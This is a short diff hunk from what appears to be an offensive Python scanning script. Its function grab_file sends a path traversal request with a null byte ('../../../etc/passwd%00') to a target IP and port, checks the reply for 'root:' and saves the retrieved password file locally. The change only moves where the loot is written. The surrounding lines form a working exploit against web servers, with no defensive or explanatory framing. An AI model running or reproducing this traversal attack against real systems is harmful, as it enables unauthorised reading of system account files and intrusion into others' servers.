@@ -23,7 +23,7 @@ def grab_file (IP,PORT):
 		response = session.get("http://"+IP+":"+PORT+"/../../../../../../etc/passwd%00", headers=headers, timeout=15)
 		if 'root:' in response.text:
 			print ("[*]Got Password File ... Logging to file.[*]")
-			text_file = open("./"+IP+"/passwd.txt", "a")
+			text_file = open("./found/"+IP+"passwd.txt", "a")
 			text_file.write(""+response.text+"\n")
 			text_file.close()
 		if '404 File Not Found' in response.text:
